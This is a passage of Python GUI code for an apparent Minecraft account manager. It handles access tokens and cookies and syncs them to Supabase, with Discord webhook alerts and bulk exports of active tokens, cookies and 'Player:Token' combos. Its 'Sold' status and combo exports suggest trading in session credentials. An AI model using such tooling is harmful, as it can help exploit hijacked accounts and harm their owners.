                command=self._pull_supabase_to_local
            ).pack(fill="x")

        self._supabase_status_lbl = ctk.CTkLabel(sb_card, text="", font=ctk.CTkFont(size=11), text_color="#9ca3af")
        self._supabase_status_lbl.pack(padx=18, pady=(0, 10))

        # Right Column Container
        right_container = ctk.CTkFrame(parent, fg_color="transparent")
        right_container.grid(row=1, column=1, sticky="nsew", padx=(10, 24), pady=(0, 24))
        right_container.grid_columnconfigure(0, weight=1)
        right_container.grid_rowconfigure(1, weight=1)

        # Discord Webhook Card (Top Right)
        wh_card = ctk.CTkFrame(right_container, fg_color="#1f2937", corner_radius=14)
        wh_card.grid(row=0, column=0, sticky="nsew", pady=(0, 14))
        wh_card.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(wh_card, text="📢  Discord Webhook Notifications", font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", padx=16, pady=(14, 2))

        self._sett_webhook_var = ctk.StringVar(value=cfg.get("discord_webhook", ""))
        self._sett_webhook_entry = ctk.CTkEntry(
            wh_card, textvariable=self._sett_webhook_var, placeholder_text="https://discord.com/api/webhooks/...",
            height=32, corner_radius=8, fg_color="#111827", border_color="#374151", font=ctk.CTkFont(size=11)
        )
        self._sett_webhook_entry.pack(fill="x", padx=16, pady=(6, 8))

        self._sett_notify_var = ctk.BooleanVar(value=cfg.get("notify_on_check", False))
        ctk.CTkCheckBox(
            wh_card, text="Send notification on account check",
            variable=self._sett_notify_var, font=ctk.CTkFont(size=11),
            fg_color="#3b82f6", hover_color="#2563eb"
        ).pack(anchor="w", padx=16, pady=(0, 10))

        wh_btn_row = ctk.CTkFrame(wh_card, fg_color="transparent")
        wh_btn_row.pack(fill="x", padx=16, pady=(0, 12))

        ctk.CTkButton(
            wh_btn_row, text="🔔 Send Test", height=30, corner_radius=7,
            font=ctk.CTkFont(size=11, weight="bold"), fg_color="#6366f1", hover_color="#4f46e5",
            command=self._test_discord_webhook
        ).pack(side="left", fill="x", expand=True, padx=(0, 4))

        ctk.CTkButton(
            wh_btn_row, text="💾 Save Webhook", height=30, corner_radius=7,
            font=ctk.CTkFont(size=11, weight="bold"), fg_color="#22c55e", hover_color="#16a34a", text_color="#000000",
            command=self._save_settings
        ).pack(side="left", fill="x", expand=True, padx=(4, 0))

        self._webhook_status_lbl = ctk.CTkLabel(wh_card, text="", font=ctk.CTkFont(size=10), text_color="#9ca3af")
        self._webhook_status_lbl.pack(padx=16, pady=(0, 8))

        # Multi-Format Exporters Card (Bottom Right)
        exp_card = ctk.CTkFrame(right_container, fg_color="#1f2937", corner_radius=14)
        exp_card.grid(row=1, column=0, sticky="nsew")
        exp_card.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(exp_card, text="📦  Multi-Format Exporters", font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", padx=16, pady=(14, 6))

        exp_btns = [
            ("📦 Export All Accounts (JSON Backup)", self._export_all_json, "#374151", "#4b5563"),
            ("🔑 Export Active Tokens Only (.txt)", self._export_active_tokens, "#3b82f6", "#2563eb"),
            ("🍪 Export Active Cookies Only (.txt)", self._export_active_cookies, "#b45309", "#92400e"),
            ("👤 Export Combos (Player:Token)", self._export_combos, "#374151", "#4b5563"),
            ("🦅 Export Only Accounts With Capes (.txt)", self._export_capes_accounts, "#0284c7", "#0369a1"),
        ]

        for label, cmd, col, hov in exp_btns:
            ctk.CTkButton(
                exp_card, text=label, height=32, corner_radius=7, anchor="w",
                font=ctk.CTkFont(size=11, weight="bold"), fg_color=col, hover_color=hov,
                command=cmd
            ).pack(fill="x", padx=16, pady=3)

    def _test_supabase_connection(self):
        url = self._sett_sb_url_var.get().strip()
        key = self._sett_sb_key_var.get().strip()
        if not url or not key:
            messagebox.showwarning("Supabase Config", "Please enter both Project URL and API Key.")
            return
        self._supabase_status_lbl.configure(text="⏳ Testing connection...", text_color="#f59e0b")
        def worker():
            ok, msg = supabase_test_connection(url, key)
            def update():
                if ok:
                    self._supabase_status_lbl.configure(text="✅ Connected to Supabase successfully!", text_color="#22c55e")
                else:
                    self._supabase_status_lbl.configure(text=f"❌ Connection failed: {msg}", text_color="#ef4444")
            self.after(0, update)
        threading.Thread(target=worker, daemon=True).start()

    def _save_supabase_settings(self):
        url = self._sett_sb_url_var.get().strip()
        key = self._sett_sb_key_var.get().strip()
        sync_enabled = self._sett_sb_sync_var.get()
        self.supabase_url = url
        self.supabase_key = key
        self.supabase_enabled = sync_enabled

        cfg = _load_config()
        cfg["supabase_url"] = url
        cfg["supabase_key"] = key
        cfg["supabase_enabled"] = sync_enabled
        _save_config(cfg)

        self._supabase_status_lbl.configure(text="✅ Supabase settings saved!", text_color="#22c55e")
        messagebox.showinfo("Supabase", "Supabase Cloud Database settings saved successfully.")

    def _push_local_to_supabase(self):
        url = self._sett_sb_url_var.get().strip()
        key = self._sett_sb_key_var.get().strip()
        if not url or not key:
            messagebox.showwarning("Supabase", "Configure URL & API Key first.")
            return
        if not self.accounts:
            messagebox.showinfo("Supabase", "No local accounts to push.")
            return
        self._supabase_status_lbl.configure(text=f"⏳ Pushing {len(self.accounts)} accounts to Cloud...", text_color="#f59e0b")
        def worker():
            ok, msg = supabase_upsert_accounts(url, key, self.active_db_user, self.accounts)
            def update():
                if ok:
                    self._supabase_status_lbl.configure(text=f"✅ Pushed {len(self.accounts)} accounts to Supabase!", text_color="#22c55e")
                    messagebox.showinfo("Supabase Push", f"Successfully synced {len(self.accounts)} accounts to Supabase cloud!")
                else:
                    self._supabase_status_lbl.configure(text=f"❌ Push failed: {msg}", text_color="#ef4444")
                    messagebox.showerror("Supabase Push Error", f"Failed to push accounts:\n{msg}")
            self.after(0, update)
        threading.Thread(target=worker, daemon=True).start()

    def _pull_supabase_to_local(self):
        self._async_pull_supabase(silent=False)

    def _async_pull_supabase(self, silent=True):
        url = getattr(self, "supabase_url", DEFAULT_SUPABASE_URL)
        key = getattr(self, "supabase_key", DEFAULT_SUPABASE_KEY)
        owner = getattr(self, "active_db_user", "admin")
        if not url or not key:
            return
        def worker():
            cloud_accs = supabase_fetch_accounts(url, key, owner)
            if not cloud_accs:
                if not silent:
                    self.after(0, lambda: messagebox.showinfo("Supabase", f"No cloud accounts found for user '{owner}'."))
                return

            if owner in ("👑 ALL USERS", "all", "ALL"):
                self.accounts = cloud_accs
                def update_all():
                    self.sort_accounts(self.sort_by_var.get())
                    self._refresh_list()
                    if hasattr(self, "_supabase_status_lbl"):
                        self._supabase_status_lbl.configure(text=f"✅ Loaded {len(cloud_accs)} accounts (Master View)", text_color="#22c55e")
                    if not silent:
                        messagebox.showinfo("Master View", f"✅ Loaded {len(cloud_accs)} total accounts from all users in Supabase!")
                self.after(0, update_all)
                return

            def _k(a):
                return (a.get("name", "").lower(), a.get("token", ""))

            local_map = {_k(a): idx for idx, a in enumerate(self.accounts)}
            added = 0
            for ca in cloud_accs:
                k = _k(ca)
                if k in local_map:
                    idx = local_map[k]
                    for field in ("status", "email", "token", "cookie", "note", "last_checked", "capes", "owner"):
                        if ca.get(field):
                            self.accounts[idx][field] = ca[field]
                else:
                    self.accounts.append(ca)
                    added += 1

            self.save_accounts(push_cloud=False)
            def update_ui():
                self.sort_accounts(self.sort_by_var.get())
                self._refresh_list()
                if hasattr(self, "_supabase_status_lbl"):
                    self._supabase_status_lbl.configure(text=f"✅ Synced {len(cloud_accs)} cloud accounts ({added} new)", text_color="#22c55e")
                if not silent:
                    messagebox.showinfo("Supabase Sync", f"✅ Synced {len(cloud_accs)} cloud accounts!\n({added} new accounts added)")
            self.after(0, update_ui)
        threading.Thread(target=worker, daemon=True).start()

    def _test_discord_webhook(self):
        url = self._sett_webhook_var.get().strip()
        if not url:
            messagebox.showwarning("Webhook URL", "Please enter a Discord Webhook URL.")
            return
        self._webhook_status_lbl.configure(text="⏳ Sending test embed...", text_color="#f59e0b")
        def worker():
            fields = [
                {"name": "Status", "value": "🟢 Webhook Connected!", "inline": True},
                {"name": "Total Accounts", "value": str(len(self.accounts)), "inline": True},
            ]
            ok, msg = send_discord_webhook(url, "🔔 Test Notification — MC Account Manager", "Discord Webhook is configured and working perfectly!", fields=fields, color=0x22c55e)
            def update():
                if ok:
                    self._webhook_status_lbl.configure(text="✅ Test notification sent successfully!", text_color="#22c55e")
                else:
                    self._webhook_status_lbl.configure(text=f"❌ Failed: {msg}", text_color="#ef4444")
            self.after(0, update)
        threading.Thread(target=worker, daemon=True).start()

    def _save_settings(self):
        cfg = _load_config()
        cfg["discord_webhook"] = self._sett_webhook_var.get().strip()
        cfg["notify_on_check"] = self._sett_notify_var.get()
        _save_config(cfg)
        self._webhook_status_lbl.configure(text="✅ Settings saved!", text_color="#22c55e")
        messagebox.showinfo("Settings", "Settings saved successfully.")

    def _export_all_json(self):
        fpath = filedialog.asksaveasfilename(defaultextension=".json", initialfile="accounts_backup.json", filetypes=[("JSON", "*.json")])
        if fpath:
            with open(fpath, "w", encoding="utf-8") as f:
                json.dump(self.accounts, f, indent=2)
            messagebox.showinfo("Exported", f"Exported {len(self.accounts)} accounts to JSON.")

    def _export_active_tokens(self):
        tokens = [a.get("token") for a in self.accounts if a.get("status") == "Active" and a.get("token")]
        if not tokens:
            messagebox.showinfo("Export", "No active tokens found.")
            return
        fpath = filedialog.asksaveasfilename(defaultextension=".txt", initialfile="active_tokens.txt", filetypes=[("Text File", "*.txt")])
        if fpath:
            with open(fpath, "w", encoding="utf-8") as f:
                f.write("\n".join(tokens))
            messagebox.showinfo("Exported", f"Exported {len(tokens)} active tokens.")

    def _export_active_cookies(self):
        cookies = [a.get("cookie") for a in self.accounts if a.get("status") == "Active" and a.get("cookie")]
        if not cookies:
            messagebox.showinfo("Export", "No active cookies found.")
            return
        fpath = filedialog.asksaveasfilename(defaultextension=".txt", initialfile="active_cookies.txt", filetypes=[("Text File", "*.txt")])
        if fpath:
            with open(fpath, "w", encoding="utf-8") as f:
                f.write("\n\n---\n\n".join(cookies))
            messagebox.showinfo("Exported", f"Exported {len(cookies)} active cookies.")

    def _export_combos(self):
        combos = [f"{a.get('name')}:{a.get('token')}" for a in self.accounts if a.get("token")]
        if not combos:
            messagebox.showinfo("Export", "No accounts with tokens found.")
            return
        fpath = filedialog.asksaveasfilename(defaultextension=".txt", initialfile="user_tokens.txt", filetypes=[("Text File", "*.txt")])
        if fpath:
            with open(fpath, "w", encoding="utf-8") as f:
                f.write("\n".join(combos))
            messagebox.showinfo("Exported", f"Exported {len(combos)} user:token combos.")

    def _export_capes_accounts(self):
        cape_accs = [a for a in self.accounts if a.get("capes")]
        if not cape_accs:
            messagebox.showinfo("Export", "No accounts with detected capes found.")
            return
        fpath = filedialog.asksaveasfilename(defaultextension=".txt", initialfile="capes_accounts.txt", filetypes=[("Text File", "*.txt")])
        if fpath:
            lines = [f"{a.get('name')} | Capes: {', '.join(a.get('capes', []))} | Token: {a.get('token', '')}" for a in cape_accs]
            with open(fpath, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
            messagebox.showinfo("Exported", f"Exported {len(cape_accs)} accounts with capes.")

    # ─────────────────── TOKEN CONVERTER PAGE ────────────────────────────

    def _build_token_converter_page(self, parent):
        parent.grid_columnconfigure(0, weight=1)
        parent.grid_rowconfigure(2, weight=1)

        ctk.CTkLabel(parent, text="Token Converter", font=ctk.CTkFont(size=22, weight="bold")
                     ).grid(row=0, column=0, sticky="w", padx=32, pady=(28, 4))
        ctk.CTkLabel(parent, text="Paste a Bearer / Access Token to validate and get player info.",
                     font=ctk.CTkFont(size=13), text_color="#6b7280"
                     ).grid(row=1, column=0, sticky="w", padx=32, pady=(0, 16))

        card = ctk.CTkFrame(parent, fg_color="#1f2937", corner_radius=14)
        card.grid(row=2, column=0, sticky="nsew", padx=32, pady=(0, 32))
        card.grid_columnconfigure(0, weight=1)
        card.grid_columnconfigure(1, weight=1)

        # Input
        lf = ctk.CTkFrame(card, fg_color="transparent")
        lf.grid(row=0, column=0, sticky="nsew", padx=16, pady=16)
        lf.grid_columnconfigure(0, weight=1)
        ctk.CTkLabel(lf, text="REFRESH / ACCESS TOKEN", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").grid(row=0, column=0, sticky="w")
        self._conv_in_tb = ctk.CTkTextbox(lf, height=120, font=ctk.CTkFont(family="Consolas", size=11), fg_color="#111827", corner_radius=8)
        self._conv_in_tb.grid(row=1, column=0, sticky="ew", pady=(6, 0))

        # Output
        rf = ctk.CTkFrame(card, fg_color="transparent")
        rf.grid(row=0, column=1, sticky="nsew", padx=16, pady=16)
        rf.grid_columnconfigure(0, weight=1)
        ctk.CTkLabel(rf, text="ACCESS TOKEN (validated)", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").grid(row=0, column=0, sticky="w")
        self._conv_out_tb = ctk.CTkTextbox(rf, height=120, font=ctk.CTkFont(family="Consolas", size=11), fg_color="#111827", corner_radius=8)
        self._conv_out_tb.grid(row=1, column=0, sticky="ew", pady=(6, 0))

        # Info
        info = ctk.CTkFrame(card, fg_color="#111827", corner_radius=8)
        info.grid(row=1, column=0, columnspan=2, sticky="ew", padx=16, pady=(0, 8))
        info.grid_columnconfigure(0, weight=1)
        info.grid_columnconfigure(1, weight=1)
        self._conv_player_lbl = ctk.CTkLabel(info, text="PLAYER\n—", font=ctk.CTkFont(size=11), text_color="#9ca3af")
        self._conv_player_lbl.grid(row=0, column=0, padx=16, pady=10)
        self._conv_uuid_lbl = ctk.CTkLabel(info, text="UUID\n—", font=ctk.CTkFont(size=11), text_color="#9ca3af")
        self._conv_uuid_lbl.grid(row=0, column=1, padx=16, pady=10)

        ctk.CTkButton(card, text="⇄  Check / Convert", height=42,
                      font=ctk.CTkFont(size=14, weight="bold"),
                      fg_color="#3b82f6", hover_color="#2563eb", corner_radius=10,
                      command=self._do_convert_token,
                      ).grid(row=2, column=0, columnspan=2, sticky="ew", padx=16, pady=(4, 16))

    def _do_convert_token(self):
        tok = self._conv_in_tb.get("1.0", "end").strip()
        if not tok:
            messagebox.showwarning("Missing Token", "Paste a token first.")
            return
        self._conv_player_lbl.configure(text="PLAYER\n⏳ checking...")
        self._conv_uuid_lbl.configure(text="UUID\n⏳ ...")

        def worker():
            res = check_token_profile(tok)
            is_valid, player_name, uuid = res[0], res[1], res[2]
            self.after(0, lambda: self._apply_conversion(is_valid, player_name, uuid, tok))
        threading.Thread(target=worker, daemon=True).start()

    def _apply_conversion(self, is_valid, player_name, uuid, token):
        if is_valid:
            self._conv_out_tb.delete("1.0", "end")
            self._conv_out_tb.insert("1.0", token)
            self._conv_player_lbl.configure(text=f"PLAYER\n{player_name or '—'}")
            self._conv_uuid_lbl.configure(text=f"UUID\n{uuid or '—'}")
        else:
            self._conv_player_lbl.configure(text="PLAYER\n❌ Invalid")
            self._conv_uuid_lbl.configure(text="UUID\n—")

    # ─────────────────── DATA / FILTERING ────────────────────────────────

    def sort_accounts(self, sort_key="Active First"):
        rank = {"Active": 0, "Unknown": 1, "Sold": 2, "Invalid": 3, "Banned": 4}
        if sort_key == "Active First":
            self.accounts.sort(key=lambda a: (rank.get(a.get("status", "Unknown"), 1), a.get("name", "").lower()))
        elif sort_key == "Name (A-Z)":
            self.accounts.sort(key=lambda a: a.get("name", "").lower())
        elif sort_key == "Last Checked":
            self.accounts.sort(key=lambda a: a.get("last_checked", ""), reverse=True)
        elif sort_key == "Status":
            self.accounts.sort(key=lambda a: a.get("status", ""))
        self._refresh_list()

    def _get_filtered_accounts(self):
        flt = self.filter_var.get()
        q = self.search_var.get().strip().lower()
        result = []
        for i, a in enumerate(self.accounts):
            if flt == "Active Only" and a.get("status") != "Active":
                continue
            if flt == "Invalid / Banned" and a.get("status") not in ("Invalid", "Banned"):
                continue
            if flt == "Cookies Only" and not a.get("cookie"):
                continue
            if flt == "Tokens Only" and (not a.get("token") or a.get("cookie")):
                continue
            if flt == "Sold" and a.get("status") != "Sold":
                continue
            if q:
                hay = (a.get("name", "") + a.get("email", "") + a.get("note", "")).lower()
                if q not in hay:
                    continue
            result.append((i, a))
        return result

    # ─────────────────── RENDER ───────────────────────────────────────────

    def _refresh_list(self):
        for widget in self.scroll.winfo_children():
            try:
                widget.destroy()
            except Exception:
                pass
        self.row_frames = []

        filtered = self._get_filtered_accounts()
        total = len(self.accounts)
        active = sum(1 for a in self.accounts if a.get("status") == "Active")
        try:
            self.count_label.configure(text=f"{len(filtered)}/{total}  ✅{active}")
        except Exception:
            pass

        if self.view_mode == "grid":
            self._render_grid(filtered)
        else:
            self._render_listview(filtered)

    def _render_grid(self, filtered):
        COLS = 3
        PAD = 6
        CARD_H = 115

        for c in range(COLS):
            self.scroll.grid_columnconfigure(c, weight=1, uniform="grid_cols")

        for row_idx, (i, acc) in enumerate(filtered):
            col_idx = row_idx % COLS
            row_grid = row_idx // COLS

            card = ctk.CTkFrame(self.scroll, fg_color="#1f2937", corner_radius=12, height=CARD_H)
            card.grid(row=row_grid, column=col_idx, padx=PAD, pady=PAD, sticky="nsew")
            card.grid_propagate(False)

            # Avatar + name
            head = ctk.CTkFrame(card, fg_color="transparent")
            head.pack(fill="x", padx=12, pady=(12, 4))

            av = ctk.CTkLabel(head, text="?", width=42, height=42, fg_color="#374151",
                              corner_radius=21, font=ctk.CTkFont(size=16))
            av.pack(side="left")
            self._request_skin(acc.get("name", ""), av, size=42)

            name_col = ctk.CTkFrame(head, fg_color="transparent")
            name_col.pack(side="left", padx=(10, 0), fill="x", expand=True)

            status_val = acc.get("status", "Unknown")
            badge_c = STATUS_COLORS.get(status_val, "#6b7280")
            ctk.CTkLabel(name_col, text=acc.get("name", "—"),
                         font=ctk.CTkFont(size=13, weight="bold"), anchor="w").pack(fill="x")
            
            sub_badge = ctk.CTkFrame(name_col, fg_color="transparent")
            sub_badge.pack(anchor="w", pady=(2, 0))
            ctk.CTkLabel(sub_badge, text=f" {status_val} ",
                         font=ctk.CTkFont(size=9, weight="bold"),
                         fg_color=badge_c, corner_radius=4, height=18, text_color="#fff",
                         ).pack(side="left")

            owner_val = acc.get("owner", "")
            if owner_val and (self.is_admin or self.active_db_user.startswith("👑")):
                ctk.CTkLabel(sub_badge, text=f" 👤 {owner_val} ",
                             font=ctk.CTkFont(size=9, weight="bold"),
                             fg_color="#374151", corner_radius=4, height=18, text_color="#f59e0b",
                             ).pack(side="left", padx=(4, 0))

            # Info area
            info_frame = ctk.CTkFrame(card, fg_color="transparent")
            info_frame.pack(fill="x", padx=12, pady=(0, 10))

            # Date + token preview
            date_txt = acc.get("last_checked") or "—"
            ctk.CTkLabel(info_frame, text=f"📅  {date_txt}",
                         font=ctk.CTkFont(size=10), text_color="#6b7280", anchor="w").pack(fill="x")

            capes = acc.get("capes", [])
            if capes:
                ctk.CTkLabel(info_frame, text=f"🦅  {' • '.join(capes[:2])}",
                             font=ctk.CTkFont(size=10, weight="bold"), text_color="#38bdf8", anchor="w").pack(fill="x")

            tok = acc.get("token", "")
            ck = acc.get("cookie", "")
            if tok:
                p = tok[:20] + "..." if len(tok) > 20 else tok
                ctk.CTkLabel(info_frame, text=f"🪪  {p}",
                             font=ctk.CTkFont(family="Consolas", size=10),
                             text_color="#9ca3af", anchor="w").pack(fill="x")
            elif ck:
                ctk.CTkLabel(info_frame, text="🍪  Cookie account",
                             font=ctk.CTkFont(size=10), text_color="#f59e0b", anchor="w").pack(fill="x")
            else:
                ctk.CTkLabel(info_frame, text="— No token/cookie —",
                             font=ctk.CTkFont(size=10), text_color="#4b5563", anchor="w").pack(fill="x")

            # Click = open detail
            for w in (card, head, name_col, info_frame):
                w.bind("<Button-1>", lambda e, idx=i: self._open_account_detail(idx))
            self.row_frames.append(card)

    def _render_listview(self, filtered):
        self.scroll.grid_columnconfigure(0, weight=1)
        for c in range(1, 7):
            self.scroll.grid_columnconfigure(c, weight=0)

        for row_idx, (i, acc) in enumerate(filtered):
            row = ctk.CTkFrame(self.scroll, fg_color="#1f2937", corner_radius=8, height=54)
            row.grid(row=row_idx, column=0, sticky="ew", padx=10, pady=3)
            row.grid_propagate(False)
            row.grid_columnconfigure(2, weight=1)

            av = ctk.CTkLabel(row, text="?", width=36, height=36,
                              fg_color="#374151", corner_radius=18, font=ctk.CTkFont(size=13))
            av.grid(row=0, column=0, padx=(12, 8), pady=9)
            self._request_skin(acc.get("name", ""), av, size=36)

            ctk.CTkLabel(row, text=acc.get("name", "—"),
                         font=ctk.CTkFont(size=13, weight="bold"), anchor="w", width=140,
                         ).grid(row=0, column=1, sticky="w", padx=4)

            ctk.CTkLabel(row, text=acc.get("last_checked") or "—",
                         font=ctk.CTkFont(size=11), text_color="#6b7280", anchor="w",
                         ).grid(row=0, column=2, sticky="w", padx=8)

            tok = acc.get("token", "")
            ck = acc.get("cookie", "")
            capes = acc.get("capes", [])
            if capes:
                ctk.CTkLabel(row, text=f"🦅 {capes[0]}", font=ctk.CTkFont(size=10, weight="bold"),
                             text_color="#38bdf8", anchor="w", width=130,
                             ).grid(row=0, column=3, sticky="w", padx=4)
            elif tok:
                ctk.CTkLabel(row, text=tok[:20] + "...", font=ctk.CTkFont(family="Consolas", size=10),
                             text_color="#9ca3af", anchor="w", width=130,
                             ).grid(row=0, column=3, sticky="w", padx=4)
            elif ck:
                ctk.CTkLabel(row, text="🍪 Cookie", font=ctk.CTkFont(size=10),
                             text_color="#f59e0b", anchor="w", width=130,
                             ).grid(row=0, column=3, sticky="w", padx=4)
            else:
                ctk.CTkLabel(row, text="—", font=ctk.CTkFont(size=10),
                             text_color="#4b5563", anchor="w", width=130,
                             ).grid(row=0, column=3, sticky="w", padx=4)

            owner_val = acc.get("owner", "")
            if owner_val and (self.is_admin or self.active_db_user.startswith("👑")):
                ctk.CTkLabel(row, text=f"👤 {owner_val}", font=ctk.CTkFont(size=10, weight="bold"),
                             text_color="#f59e0b", anchor="w", width=80,
                             ).grid(row=0, column=4, sticky="w", padx=4)

            status_val = acc.get("status", "Unknown")
            ctk.CTkLabel(row, text=status_val,
                         font=ctk.CTkFont(size=10, weight="bold"),
                         fg_color=STATUS_COLORS.get(status_val, "#6b7280"),
                         corner_radius=6, width=68, height=22, text_color="#fff",
                         ).grid(row=0, column=5, padx=8)

            af = ctk.CTkFrame(row, fg_color="transparent")
            af.grid(row=0, column=6, padx=(4, 8))
            ctk.CTkButton(af, text="Edit", width=52, height=26, font=ctk.CTkFont(size=11),
                          fg_color="#374151", hover_color="#4b5563", corner_radius=6,
                          command=lambda idx=i: self._open_edit_dialog(idx),
                          ).pack(side="left", padx=2)
            ctk.CTkButton(af, text="🗑", width=30, height=26, font=ctk.CTkFont(size=12),
                          fg_color="transparent", hover_color="#7f1d1d", corner_radius=6,
                          command=lambda idx=i: self.delete_account(idx),
                          ).pack(side="left")

            row.bind("<Button-1>", lambda e, idx=i: self._open_account_detail(idx))
            self.row_frames.append(row)

    # ─────────────────── ACCOUNT DETAIL POPUP ────────────────────────────

    def _open_account_detail(self, index):
        acc = self.accounts[index]
        dlg = ctk.CTkToplevel(self)
        dlg.title(acc.get("name", "Account"))
        dlg.geometry("450x560")
        dlg.resizable(False, False)
        dlg.grab_set()
        dlg.lift()

        self.update_idletasks()
        px, py = self.winfo_x(), self.winfo_y()
        pw, ph = self.winfo_width(), self.winfo_height()
        dlg.geometry(f"+{px + pw//2 - 225}+{py + ph//2 - 280}")

        # Close btn
        ctk.CTkButton(dlg, text="✕", width=28, height=28, corner_radius=14,
                      fg_color="#374151", hover_color="#6b7280", font=ctk.CTkFont(size=11),
                      command=dlg.destroy,
                      ).place(x=410, y=10)

        # Avatar
        av_big = ctk.CTkLabel(dlg, text="?", width=68, height=68,
                              fg_color="#374151", corner_radius=34, font=ctk.CTkFont(size=24))
        av_big.pack(pady=(28, 0))
        self._request_skin(acc.get("name", ""), av_big, size=68)

        ctk.CTkLabel(dlg, text=acc.get("name", "—"), font=ctk.CTkFont(size=18, weight="bold")).pack(pady=(8, 0))

        status_val = acc.get("status", "Unknown")
        badge_c = STATUS_COLORS.get(status_val, "#6b7280")
        sub = ctk.CTkFrame(dlg, fg_color="transparent")
        sub.pack(pady=(4, 0))
        ctk.CTkLabel(sub, text=f"Checked: {acc.get('last_checked') or '—'}",
                     font=ctk.CTkFont(size=11), text_color="#6b7280").pack(side="left")
        ctk.CTkLabel(sub, text=f"  •  {status_val}",
                     font=ctk.CTkFont(size=11, weight="bold"), text_color=badge_c).pack(side="left")

        ff = ctk.CTkFrame(dlg, fg_color="transparent")
        ff.pack(fill="x", padx=24, pady=(10, 0))

        def _info_row(parent, lbl, val):
            if not val:
                return
            f = ctk.CTkFrame(parent, fg_color="#1f2937", corner_radius=8)
            f.pack(fill="x", pady=2)
            f.grid_columnconfigure(0, weight=1)
            ctk.CTkLabel(f, text=lbl, font=ctk.CTkFont(size=9, weight="bold"),
                         text_color="#6b7280", anchor="w").grid(row=0, column=0, sticky="w", padx=10, pady=(4, 0))
            disp = (val[:28] + "...") if len(val) > 28 else val
            ctk.CTkLabel(f, text=disp, font=ctk.CTkFont(family="Consolas", size=11),
                         anchor="w", text_color="#e5e7eb").grid(row=1, column=0, sticky="w", padx=10, pady=(0, 4))
            ctk.CTkButton(f, text="⧉", width=28, height=28, fg_color="transparent",
                          hover_color="#374151",
                          command=lambda v=val: (self.clipboard_clear(), self.clipboard_append(v)),
                          ).grid(row=0, column=1, rowspan=2, padx=(0, 8))

        if acc.get("owner"):
            _info_row(ff, "ACCOUNT OWNER", acc.get("owner"))

        _info_row(ff, "EMAIL", acc.get("email", ""))
        _info_row(ff, "ACCESS TOKEN", acc.get("token", ""))
        _info_row(ff, "COOKIE", acc.get("cookie", ""))
        if acc.get("capes"):
            _info_row(ff, "CAPES DETECTED", " • ".join(acc.get("capes")))
        _info_row(ff, "NOTES", acc.get("note", ""))

        # Buttons
        tok = acc.get("token", "")

        def _refresh_token():
            if not tok:
                messagebox.showwarning("No Token", "No token to refresh.", parent=dlg)
                return
            def w():
                res = check_token_profile(tok)
                ok, pname, uid = res[0], res[1], res[2]
                self.accounts[index]["status"] = "Active" if ok else "Invalid"
                if pname:
                    self.accounts[index]["name"] = pname
                if len(res) > 3 and res[3]:
                    self.accounts[index]["capes"] = res[3]
                self.accounts[index]["last_checked"] = date.today().isoformat()
                self.save_accounts()
                self.after(0, lambda: (self._refresh_list(), dlg.destroy()))
            threading.Thread(target=w, daemon=True).start()

        def _copy_all():
            parts = []
            for k, v in [("Name", acc.get("name")), ("Email", acc.get("email")),
                         ("Token", tok), ("Cookie", acc.get("cookie")), ("Capes", ", ".join(acc.get("capes", [])))]:
                if v:
                    parts.append(f"{k}: {v}")
            self.clipboard_clear()
            self.clipboard_append("\n".join(parts))

        def _view_skin_in_tab():
            dlg.destroy()
            self._switch_page("profile")
            self._prof_search_var.set(acc.get("name", ""))
            self._load_profile_view()

        br = ctk.CTkFrame(dlg, fg_color="transparent")
        br.pack(fill="x", padx=24, pady=(10, 4))
        ctk.CTkButton(br, text="🔄 Refresh Token", height=34,
                      fg_color="#3b82f6", hover_color="#2563eb",
                      font=ctk.CTkFont(size=11, weight="bold"), corner_radius=7,
                      command=_refresh_token,
                      ).pack(side="left", expand=True, fill="x", padx=(0, 3))
        ctk.CTkButton(br, text="🎭 3D Skin", height=34,
                      fg_color="#6366f1", hover_color="#4f46e5",
                      font=ctk.CTkFont(size=11, weight="bold"), corner_radius=7,
                      command=_view_skin_in_tab,
                      ).pack(side="left", expand=True, fill="x", padx=3)
        ctk.CTkButton(br, text="⧉ Copy All", height=34,
                      fg_color="#374151", hover_color="#4b5563",
                      font=ctk.CTkFont(size=11, weight="bold"), corner_radius=7,
                      command=_copy_all,
                      ).pack(side="left", expand=True, fill="x", padx=(3, 0))

        er = ctk.CTkFrame(dlg, fg_color="transparent")
        er.pack(fill="x", padx=24, pady=(0, 14))
        ctk.CTkButton(er, text="✏ Edit", height=30,
                      fg_color="#374151", hover_color="#4b5563",
                      font=ctk.CTkFont(size=11), corner_radius=7,
                      command=lambda: (dlg.destroy(), self._open_edit_dialog(index)),
                      ).pack(side="left", expand=True, fill="x", padx=(0, 3))
        ctk.CTkButton(er, text="🗑 Delete", height=30,
                      fg_color="#7f1d1d", hover_color="#991b1b",
                      font=ctk.CTkFont(size=11), corner_radius=7,
                      command=lambda: (dlg.destroy(), self.delete_account(index)),
                      ).pack(side="left", expand=True, fill="x", padx=(3, 0))

    # ─────────────────── EDIT DIALOG ─────────────────────────────────────

    def _open_edit_dialog(self, index=None):
        self.selected_index = index
        acc = self.accounts[index] if index is not None else {}
        status_map = {"Unbekannt": "Unknown", "Aktiv": "Active", "Gesperrt": "Banned", "Verkauft": "Sold"}

        self.name_var.set(acc.get("name", ""))
        self.email_var.set(acc.get("email", ""))
        self.status_var.set(status_map.get(acc.get("status", STATUS_OPTIONS[0]), acc.get("status", STATUS_OPTIONS[0])))
        self.token_var.set(acc.get("token", ""))
        self.cookie_var.set(acc.get("cookie", ""))
        self.note_var.set(acc.get("note", ""))
        self.last_checked_var.set(acc.get("last_checked", ""))

        dlg = ctk.CTkToplevel(self)
        dlg.title("Edit Account" if index is not None else "Add Account")
        dlg.geometry("560x580")
        dlg.resizable(False, False)
        dlg.grab_set()
        dlg.lift()

        self.update_idletasks()
        px, py = self.winfo_x(), self.winfo_y()
        pw, ph = self.winfo_width(), self.winfo_height()
        dlg.geometry(f"+{px + pw//2 - 280}+{py + ph//2 - 290}")

        def _lbl(p, t):
            ctk.CTkLabel(p, text=t, font=ctk.CTkFont(size=11), text_color="#9ca3af", anchor="w").pack(fill="x")

        sf = ctk.CTkScrollableFrame(dlg, fg_color="transparent")
        sf.pack(fill="both", expand=True, padx=20, pady=(16, 0))

        # Name + avatar
        nw = ctk.CTkFrame(sf, fg_color="transparent")
        nw.pack(fill="x", pady=(0, 10))
